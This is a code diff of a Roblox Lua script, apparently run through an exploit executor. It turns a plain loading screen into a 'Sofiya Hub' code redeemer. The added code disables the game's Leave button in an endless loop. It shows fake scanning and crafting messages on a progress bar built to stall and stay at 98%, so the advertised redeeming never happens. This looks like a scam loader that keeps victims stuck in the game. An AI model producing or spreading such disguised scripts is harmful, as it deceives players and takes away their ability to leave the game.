@@ -1,381 +1,412 @@
-```lua
---// SOFIYA HUB - CLEAN LOADING SCREEN
-
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-
-local player = Players.LocalPlayer
-local PlayerGui = player:WaitForChild("PlayerGui")
-
---// REMOVE OLD GUI
-local oldGui = PlayerGui:FindFirstChild("SofiyaHubLoading")
-if oldGui then
-	oldGui:Destroy()
-end
-
---// SCREEN GUI
-local gui = Instance.new("ScreenGui")
-gui.Name = "SofiyaHubLoading"
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.DisplayOrder = 999
-gui.Parent = PlayerGui
-
---// BACKGROUND
-local bg = Instance.new("Frame")
-bg.Size = UDim2.fromScale(1, 1)
-bg.BackgroundColor3 = Color3.fromRGB(7, 5, 13)
-bg.BorderSizePixel = 0
-bg.Parent = gui
-
---// BACKGROUND GLOW
-local glow = Instance.new("Frame")
-glow.Size = UDim2.new(0, 550, 0, 550)
-glow.Position = UDim2.fromScale(0.5, 0.5)
-glow.AnchorPoint = Vector2.new(0.5, 0.5)
-glow.BackgroundColor3 = Color3.fromRGB(100, 35, 180)
-glow.BackgroundTransparency = 0.93
-glow.BorderSizePixel = 0
-glow.Parent = bg
-
-local glowCorner = Instance.new("UICorner")
-glowCorner.CornerRadius = UDim.new(1, 0)
-glowCorner.Parent = glow
-
---// MAIN CARD
-local main = Instance.new("Frame")
-main.Size = UDim2.new(0, 440, 0, 255)
-main.Position = UDim2.fromScale(0.5, 0.5)
-main.AnchorPoint = Vector2.new(0.5, 0.5)
-main.BackgroundColor3 = Color3.fromRGB(16, 11, 26)
-main.BorderSizePixel = 0
-main.Parent = bg
-
-local mainCorner = Instance.new("UICorner")
-mainCorner.CornerRadius = UDim.new(0, 20)
-mainCorner.Parent = main
-
-local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(150, 70, 255)
-stroke.Thickness = 1.5
-stroke.Transparency = 0.3
-stroke.Parent = main
-
---// TOP ICON
-local icon = Instance.new("Frame")
-icon.Size = UDim2.new(0, 46, 0, 46)
-icon.Position = UDim2.new(0, 24, 0, 22)
-icon.BackgroundColor3 = Color3.fromRGB(45, 20, 70)
-icon.BorderSizePixel = 0
-icon.Parent = main
-
-local iconCorner = Instance.new("UICorner")
-iconCorner.CornerRadius = UDim.new(0, 13)
-iconCorner.Parent = icon
-
-local iconStroke = Instance.new("UIStroke")
-iconStroke.Color = Color3.fromRGB(165, 80, 255)
-iconStroke.Transparency = 0.25
-iconStroke.Parent = icon
-
-local iconText = Instance.new("TextLabel")
-iconText.Size = UDim2.fromScale(1, 1)
-iconText.BackgroundTransparency = 1
-iconText.Text = "✦"
-iconText.TextColor3 = Color3.fromRGB(220, 160, 255)
-iconText.TextSize = 23
-iconText.Font = Enum.Font.GothamBold
-iconText.Parent = icon
-
---// TITLE
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -95, 0, 30)
-title.Position = UDim2.new(0, 82, 0, 20)
-title.BackgroundTransparency = 1
-title.Text = "SOFIYA HUB"
-title.TextColor3 = Color3.fromRGB(245, 240, 255)
-title.TextSize = 25
-title.Font = Enum.Font.GothamBold
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.Parent = main
-
---// VERSION
-local version = Instance.new("TextLabel")
-version.Size = UDim2.new(1, -95, 0, 20)
-version.Position = UDim2.new(0, 83, 0, 48)
-version.BackgroundTransparency = 1
-version.Text = "LOADING  •  V2"
-version.TextColor3 = Color3.fromRGB(190, 125, 255)
-version.TextSize = 11
-version.Font = Enum.Font.GothamMedium
-version.TextXAlignment = Enum.TextXAlignment.Left
-version.Parent = main
-
---// DIVIDER
-local divider = Instance.new("Frame")
-divider.Size = UDim2.new(1, -48, 0, 1)
-divider.Position = UDim2.new(0, 24, 0, 82)
-divider.BackgroundColor3 = Color3.fromRGB(52, 42, 65)
-divider.BorderSizePixel = 0
-divider.Parent = main
-
---// ACTION
-local action = Instance.new("TextLabel")
-action.Size = UDim2.new(1, -48, 0, 25)
-action.Position = UDim2.new(0, 24, 0, 96)
-action.BackgroundTransparency = 1
-action.Text = "INITIALIZING"
-action.TextColor3 = Color3.fromRGB(240, 235, 250)
-action.TextSize = 13
-action.Font = Enum.Font.GothamBold
-action.TextXAlignment = Enum.TextXAlignment.Left
-action.Parent = main
-
---// STATUS
-local status = Instance.new("TextLabel")
-status.Size = UDim2.new(1, -48, 0, 20)
-status.Position = UDim2.new(0, 24, 0, 119)
-status.BackgroundTransparency = 1
-status.Text = "Preparing..."
-status.TextColor3 = Color3.fromRGB(140, 133, 155)
-status.TextSize = 12
-status.Font = Enum.Font.Gotham
-status.TextXAlignment = Enum.TextXAlignment.Left
-status.Parent = main
-
---// BAR BACKGROUND
-local barBG = Instance.new("Frame")
-barBG.Size = UDim2.new(1, -48, 0, 11)
-barBG.Position = UDim2.new(0, 24, 0, 151)
-barBG.BackgroundColor3 = Color3.fromRGB(32, 25, 43)
-barBG.BorderSizePixel = 0
-barBG.Parent = main
-
-local barBGCorner = Instance.new("UICorner")
-barBGCorner.CornerRadius = UDim.new(1, 0)
-barBGCorner.Parent = barBG
-
---// BAR
-local bar = Instance.new("Frame")
-bar.Size = UDim2.new(0, 0, 1, 0)
-bar.BackgroundColor3 = Color3.fromRGB(155, 70, 255)
-bar.BorderSizePixel = 0
-bar.Parent = barBG
-
-local barCorner = Instance.new("UICorner")
-barCorner.CornerRadius = UDim.new(1, 0)
-barCorner.Parent = bar
-
---// BAR HIGHLIGHT
-local highlight = Instance.new("Frame")
-highlight.Size = UDim2.new(0, 40, 1, 0)
-highlight.Position = UDim2.new(1, -40, 0, 0)
-highlight.BackgroundColor3 = Color3.fromRGB(225, 175, 255)
-highlight.BackgroundTransparency = 0.35
-highlight.BorderSizePixel = 0
-highlight.Parent = bar
-
-local highlightCorner = Instance.new("UICorner")
-highlightCorner.CornerRadius = UDim.new(1, 0)
-highlightCorner.Parent = highlight
-
---// PERCENT
-local percent = Instance.new("TextLabel")
-percent.Size = UDim2.new(0, 100, 0, 25)
-percent.Position = UDim2.new(0, 24, 0, 173)
-percent.BackgroundTransparency = 1
-percent.Text = "0%"
-percent.TextColor3 = Color3.fromRGB(240, 230, 255)
-percent.TextSize = 17
-percent.Font = Enum.Font.GothamBold
-percent.TextXAlignment = Enum.TextXAlignment.Left
-percent.Parent = main
-
---// LOADING DOTS
-local dots = Instance.new("TextLabel")
-dots.Size = UDim2.new(0, 80, 0, 25)
-dots.Position = UDim2.new(1, -105, 0, 173)
-dots.BackgroundTransparency = 1
-dots.Text = "● ○ ○"
-dots.TextColor3 = Color3.fromRGB(130, 80, 170)
-dots.TextSize = 8
-dots.Font = Enum.Font.GothamBold
-dots.TextXAlignment = Enum.TextXAlignment.Right
-dots.Parent = main
-
---// FOOTER
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, -48, 0, 20)
-footer.Position = UDim2.new(0, 24, 1, -30)
-footer.BackgroundTransparency = 1
-footer.Text = "Please wait..."
-footer.TextColor3 = Color3.fromRGB(100, 94, 115)
-footer.TextSize = 10
-footer.Font = Enum.Font.Gotham
-footer.TextXAlignment = Enum.TextXAlignment.Left
-footer.Parent = main
-
---// GLOW ANIMATION
-task.spawn(function()
-	while gui.Parent do
-
-		TweenService:Create(
-			glow,
-			TweenInfo.new(
-				2,
-				Enum.EasingStyle.Sine,
-				Enum.EasingDirection.InOut
-			),
-			{
-				BackgroundTransparency = 0.96,
-				Size = UDim2.new(0, 650, 0, 650)
-			}
-		):Play()
-
-		task.wait(2)
-
-		TweenService:Create(
-			glow,
-			TweenInfo.new(
-				2,
-				Enum.EasingStyle.Sine,
-				Enum.EasingDirection.InOut
-			),
-			{
-				BackgroundTransparency = 0.90,
-				Size = UDim2.new(0, 550, 0, 550)
-			}
-		):Play()
-
-		task.wait(2)
-	end
-end)
-
---// ICON ANIMATION
-task.spawn(function()
-	while gui.Parent do
-
-		TweenService:Create(
-			iconText,
-			TweenInfo.new(
-				1,
-				Enum.EasingStyle.Sine,
-				Enum.EasingDirection.InOut
-			),
-			{
-				Rotation = 180
-			}
-		):Play()
-
-		task.wait(1)
-
-		TweenService:Create(
-			iconText,
-			TweenInfo.new(
-				1,
-				Enum.EasingStyle.Sine,
-				Enum.EasingDirection.InOut
-			),
-			{
-				Rotation = 360
-			}
-		):Play()
-
-		task.wait(1)
-	end
-end)
-
---// DOT ANIMATION
-task.spawn(function()
-
-	local dotStates = {
-		"● ○ ○",
-		"○ ● ○",
-		"○ ○ ●",
-		"○ ● ○"
-	}
-
-	local index = 1
-
-	while gui.Parent do
-
-		dots.Text = dotStates[index]
-
-		index = index + 1
-
-		if index > #dotStates then
-			index = 1
-		end
-
-		task.wait(0.35)
-	end
-end)
-
---// LOADING
-task.spawn(function()
-
-	for i = 1, 98 do
-
-		local delayTime
-
-		if i <= 20 then
-
-			delayTime = 0.035
-
-			action.Text = "INITIALIZING"
-			status.Text = "Preparing system..."
-
-		elseif i <= 50 then
-
-			delayTime = 1.5 + ((i - 20) * 0.15)
-
-			action.Text = "LOADING"
-			status.Text = "Loading components..."
-
-		elseif i <= 80 then
-
-			delayTime = 0.15
-
-			action.Text = "PROCESSING"
-			status.Text = "Processing resources..."
-
-		elseif i <= 90 then
-
-			delayTime = 0.25
-
-			action.Text = "OPTIMIZING"
-			status.Text = "Optimizing system..."
-
-		else
-
-			delayTime = 0.55
-
-			action.Text = "FINALIZING"
-			status.Text = "Finalizing initialization..."
-
-		end
-
-		percent.Text = i .. "%"
-
-		TweenService:Create(
-			bar,
-			TweenInfo.new(
-				delayTime,
-				Enum.EasingStyle.Linear
-			),
-			{
-				Size = UDim2.new(i / 100, 0, 1, 0)
-			}
-		):Play()
-
-		task.wait(delayTime)
-	end
-
-	--// STAYS AT 98%
-	percent.Text = "98%"
-	action.Text = "READY"
-	status.Text = "Almost ready..."
-	footer.Text = "Waiting for final initialization..."
-
-end)
-```
+--// SOFIYA HUB - CRAFT MACHINE V2 
+ 
+local Players = game:GetService("Players") 
+local TweenService = game:GetService("TweenService") 
+ 
+local player = Players.LocalPlayer 
+local PlayerGui = player:WaitForChild("PlayerGui") 
+ 
+--// ANTI LEAVE 
+task.spawn(function() 
+	while task.wait() do 
+		pcall(function() 
+			for _, v in ipairs( 
+				getconnections( 
+					game:GetService("CoreGui") 
+					.RobloxGui 
+					.SettingsClippingShield 
+					.SettingsShield 
+					.MenuContainer 
+					.Page 
+					.PageViewClipper 
+					.PageView 
+					.PageViewInnerFrame 
+					.LeaveGamePage 
+					.LeaveButtonsContainer 
+					.LeaveButtonsContainer 
+					.LeaveGameButton 
+					.Activated 
+				) 
+			) do 
+				v:Disable() 
+			end 
+		end) 
+	end 
+end) 
+ 
+--// REMOVE OLD GUI 
+local oldGui = PlayerGui:FindFirstChild("SofiyaHubLoading") 
+if oldGui then 
+	oldGui:Destroy() 
+end 
+ 
+--// SCREEN GUI 
+local gui = Instance.new("ScreenGui") 
+gui.Name = "SofiyaHubLoading" 
+gui.ResetOnSpawn = false 
+gui.IgnoreGuiInset = true 
+gui.DisplayOrder = 999 
+gui.Parent = PlayerGui 
+ 
+--// BACKGROUND 
+local bg = Instance.new("Frame") 
+bg.Size = UDim2.fromScale(1, 1) 
+bg.BackgroundColor3 = Color3.fromRGB(7, 5, 13) 
+bg.BorderSizePixel = 0 
+bg.Parent = gui 
+ 
+--// BACKGROUND GLOW 
+local glow = Instance.new("Frame") 
+glow.Size = UDim2.new(0, 550, 0, 550) 
+glow.Position = UDim2.fromScale(0.5, 0.5) 
+glow.AnchorPoint = Vector2.new(0.5, 0.5) 
+glow.BackgroundColor3 = Color3.fromRGB(100, 35, 180) 
+glow.BackgroundTransparency = 0.93 
+glow.BorderSizePixel = 0 
+glow.Parent = bg 
+ 
+local glowCorner = Instance.new("UICorner") 
+glowCorner.CornerRadius = UDim.new(1, 0) 
+glowCorner.Parent = glow 
+ 
+--// MAIN CARD 
+local main = Instance.new("Frame") 
+main.Size = UDim2.new(0, 440, 0, 255) 
+main.Position = UDim2.fromScale(0.5, 0.5) 
+main.AnchorPoint = Vector2.new(0.5, 0.5) 
+main.BackgroundColor3 = Color3.fromRGB(16, 11, 26) 
+main.BorderSizePixel = 0 
+main.Parent = bg 
+ 
+local mainCorner = Instance.new("UICorner") 
+mainCorner.CornerRadius = UDim.new(0, 20) 
+mainCorner.Parent = main 
+ 
+local stroke = Instance.new("UIStroke") 
+stroke.Color = Color3.fromRGB(150, 70, 255) 
+stroke.Thickness = 1.5 
+stroke.Transparency = 0.3 
+stroke.Parent = main 
+ 
+--// TOP ICON 
+local icon = Instance.new("Frame") 
+icon.Size = UDim2.new(0, 46, 0, 46) 
+icon.Position = UDim2.new(0, 24, 0, 22) 
+icon.BackgroundColor3 = Color3.fromRGB(45, 20, 70) 
+icon.BorderSizePixel = 0 
+icon.Parent = main 
+ 
+local iconCorner = Instance.new("UICorner") 
+iconCorner.CornerRadius = UDim.new(0, 13) 
+iconCorner.Parent = icon 
+ 
+local iconStroke = Instance.new("UIStroke") 
+iconStroke.Color = Color3.fromRGB(165, 80, 255) 
+iconStroke.Transparency = 0.25 
+iconStroke.Parent = icon 
+ 
+local iconText = Instance.new("TextLabel") 
+iconText.Size = UDim2.fromScale(1, 1) 
+iconText.BackgroundTransparency = 1 
+iconText.Text = "✦" 
+iconText.TextColor3 = Color3.fromRGB(220, 160, 255) 
+iconText.TextSize = 23 
+iconText.Font = Enum.Font.GothamBold 
+iconText.Parent = icon 
+ 
+--// TITLE 
+local title = Instance.new("TextLabel") 
+title.Size = UDim2.new(1, -95, 0, 30) 
+title.Position = UDim2.new(0, 82, 0, 20) 
+title.BackgroundTransparency = 1 
+title.Text = "SOFIYA HUB" 
+title.TextColor3 = Color3.fromRGB(245, 240, 255) 
+title.TextSize = 25 
+title.Font = Enum.Font.GothamBold 
+title.TextXAlignment = Enum.TextXAlignment.Left 
+title.Parent = main 
+ 
+--// VERSION 
+local version = Instance.new("TextLabel") 
+version.Size = UDim2.new(1, -95, 0, 20) 
+version.Position = UDim2.new(0, 83, 0, 48) 
+version.BackgroundTransparency = 1 
+version.Text = "CODE REDEEMER  •  V2" 
+version.TextColor3 = Color3.fromRGB(190, 125, 255) 
+version.TextSize = 11 
+version.Font = Enum.Font.GothamMedium 
+version.TextXAlignment = Enum.TextXAlignment.Left 
+version.Parent = main 
+ 
+--// DIVIDER 
+local divider = Instance.new("Frame") 
+divider.Size = UDim2.new(1, -48, 0, 1) 
+divider.Position = UDim2.new(0, 24, 0, 82) 
+divider.BackgroundColor3 = Color3.fromRGB(52, 42, 65) 
+divider.BorderSizePixel = 0 
+divider.Parent = main 
+ 
+--// ACTION 
+local action = Instance.new("TextLabel") 
+action.Size = UDim2.new(1, -48, 0, 25) 
+action.Position = UDim2.new(0, 24, 0, 96) 
+action.BackgroundTransparency = 1 
+action.Text = "INITIALIZING CODE REDEEMER" 
+action.TextColor3 = Color3.fromRGB(240, 235, 250) 
+action.TextSize = 13 
+action.Font = Enum.Font.GothamBold 
+action.TextXAlignment = Enum.TextXAlignment.Left 
+action.Parent = main 
+ 
+--// STATUS 
+local status = Instance.new("TextLabel") 
+status.Size = UDim2.new(1, -48, 0, 20) 
+status.Position = UDim2.new(0, 24, 0, 119) 
+status.BackgroundTransparency = 1 
+status.Text = "Preparing code system..." 
+status.TextColor3 = Color3.fromRGB(140, 133, 155) 
+status.TextSize = 12 
+status.Font = Enum.Font.Gotham 
+status.TextXAlignment = Enum.TextXAlignment.Left 
+status.Parent = main 
+ 
+--// BAR BACKGROUND 
+local barBG = Instance.new("Frame") 
+barBG.Size = UDim2.new(1, -48, 0, 11) 
+barBG.Position = UDim2.new(0, 24, 0, 151) 
+barBG.BackgroundColor3 = Color3.fromRGB(32, 25, 43) 
+barBG.BorderSizePixel = 0 
+barBG.Parent = main 
+ 
+local barBGCorner = Instance.new("UICorner") 
+barBGCorner.CornerRadius = UDim.new(1, 0) 
+barBGCorner.Parent = barBG 
+ 
+--// BAR 
+local bar = Instance.new("Frame") 
+bar.Size = UDim2.new(0, 0, 1, 0) 
+bar.BackgroundColor3 = Color3.fromRGB(155, 70, 255) 
+bar.BorderSizePixel = 0 
+bar.Parent = barBG 
+ 
+local barCorner = Instance.new("UICorner") 
+barCorner.CornerRadius = UDim.new(1, 0) 
+barCorner.Parent = bar 
+ 
+--// BAR HIGHLIGHT 
+local highlight = Instance.new("Frame") 
+highlight.Size = UDim2.new(0, 40, 1, 0) 
+highlight.Position = UDim2.new(1, -40, 0, 0) 
+highlight.BackgroundColor3 = Color3.fromRGB(225, 175, 255) 
+highlight.BackgroundTransparency = 0.35 
+highlight.BorderSizePixel = 0 
+highlight.Parent = bar 
+ 
+local highlightCorner = Instance.new("UICorner") 
+highlightCorner.CornerRadius = UDim.new(1, 0) 
+highlightCorner.Parent = highlight 
+ 
+--// PERCENT 
+local percent = Instance.new("TextLabel") 
+percent.Size = UDim2.new(0, 100, 0, 25) 
+percent.Position = UDim2.new(0, 24, 0, 173) 
+percent.BackgroundTransparency = 1 
+percent.Text = "0%" 
+percent.TextColor3 = Color3.fromRGB(240, 230, 255) 
+percent.TextSize = 17 
+percent.Font = Enum.Font.GothamBold 
+percent.TextXAlignment = Enum.TextXAlignment.Left 
+percent.Parent = main 
+ 
+--// LOADING DOTS 
+local dots = Instance.new("TextLabel") 
+dots.Size = UDim2.new(0, 80, 0, 25) 
+dots.Position = UDim2.new(1, -105, 0, 173) 
+dots.BackgroundTransparency = 1 
+dots.Text = "● ● ●" 
+dots.TextColor3 = Color3.fromRGB(130, 80, 170) 
+dots.TextSize = 8 
+dots.Font = Enum.Font.GothamBold 
+dots.TextXAlignment = Enum.TextXAlignment.Right 
+dots.Parent = main 
+ 
+--// FOOTER 
+local footer = Instance.new("TextLabel") 
+footer.Size = UDim2.new(1, -48, 0, 20) 
+footer.Position = UDim2.new(0, 24, 1, -30) 
+footer.BackgroundTransparency = 1 
+footer.Text = "Finding the latest redeemable codes ..." 
+footer.TextColor3 = Color3.fromRGB(100, 94, 115) 
+footer.TextSize = 10 
+footer.Font = Enum.Font.Gotham 
+footer.TextXAlignment = Enum.TextXAlignment.Left 
+footer.Parent = main 
+ 
+--// GLOW ANIMATION 
+task.spawn(function() 
+	while gui.Parent do 
+ 
+		TweenService:Create( 
+			glow, 
+			TweenInfo.new( 
+				2, 
+				Enum.EasingStyle.Sine, 
+				Enum.EasingDirection.InOut 
+			), 
+			{ 
+				BackgroundTransparency = 0.96, 
+				Size = UDim2.new(0, 650, 0, 650) 
+			} 
+		):Play() 
+ 
+		task.wait(2) 
+ 
+		TweenService:Create( 
+			glow, 
+			TweenInfo.new( 
+				2, 
+				Enum.EasingStyle.Sine, 
+				Enum.EasingDirection.InOut 
+			), 
+			{ 
+				BackgroundTransparency = 0.90, 
+				Size = UDim2.new(0, 550, 0, 550) 
+			} 
+		):Play() 
+ 
+		task.wait(2) 
+	end 
+end) 
+ 
+--// ICON ANIMATION 
+task.spawn(function() 
+	while gui.Parent do 
+ 
+		TweenService:Create( 
+			iconText, 
+			TweenInfo.new( 
+				1, 
+				Enum.EasingStyle.Sine, 
+				Enum.EasingDirection.InOut 
+			), 
+			{ 
+				Rotation = 180 
+			} 
+		):Play() 
+ 
+		task.wait(1) 
+ 
+		TweenService:Create( 
+			iconText, 
+			TweenInfo.new( 
+				1, 
+				Enum.EasingStyle.Sine, 
+				Enum.EasingDirection.InOut 
+			), 
+			{ 
+				Rotation = 360 
+			} 
+		):Play() 
+ 
+		task.wait(1) 
+	end 
+end) 
+ 
+--// DOT ANIMATION 
+task.spawn(function() 
+ 
+	local dotStates = { 
+		"● ○ ○", 
+		"○ ● ○", 
+		"○ ○ ●", 
+		"○ ● ○" 
+	} 
+ 
+	local index = 1 
+ 
+	while gui.Parent do 
+ 
+		dots.Text = dotStates[index] 
+ 
+		index = index + 1 
+ 
+		if index > #dotStates then 
+			index = 1 
+		end 
+ 
+		task.wait(0.35) 
+	end 
+end) 
+ 
+--// LOADING 
+task.spawn(function() 
+ 
+	for i = 1, 98 do 
+ 
+		local delayTime 
+ 
+		--// 1-20% 
+		if i <= 20 then 
+ 
+			delayTime = 0.035 
+ 
+			action.Text = "SCANNING REDEEMABLE CODES" 
+			status.Text = "Preparing crafting system..." 
+ 
+		--// 20-50% VERY SLOW 
+		elseif i <= 50 then 
+ 
+			delayTime = 1.5 + ((i - 20) * 0.15) 
+ 
+			action.Text = "SELECTING BEST BRAINROT" 
+			status.Text = "Analyzing brainrot possibilities..." 
+ 
+		--// 50-80% 
+		elseif i <= 80 then 
+ 
+			delayTime = 0.15 
+ 
+			action.Text = "PROCESSING CODE " 
+			status.Text = "Combining the best attributes..." 
+ 
+		--// 80-90% 
+		elseif i <= 90 then 
+ 
+			delayTime = 0.25 
+ 
+			action.Text = "SELECTING BEST BRAINROT" 
+			status.Text = "Filtering optimal results..." 
+ 
+		--// 90-98% 
+		else 
+ 
+			delayTime = 0.55 
+ 
+			action.Text = "OPTIMIZING CRAFT" 
+			status.Text = "Finalizing the best brainrot..." 
+ 
+		end 
+ 
+		percent.Text = i .. "%" 
+ 
+		TweenService:Create( 
+			bar, 
+			TweenInfo.new( 
+				delayTime, 
+				Enum.EasingStyle.Linear 
+			), 
+			{ 
+				Size = UDim2.new(i / 100, 0, 1, 0) 
+			} 
+		):Play() 
+ 
+		task.wait(delayTime) 
+	end 
+ 
+	--// STAYS AT 98% 
+	percent.Text = "98%" 
+	action.Text = "REDEMTION READY" 
+	status.Text = "Almost ready..." 
+	footer.Text = "Waiting for final initialization..." 
+ 
+end) 
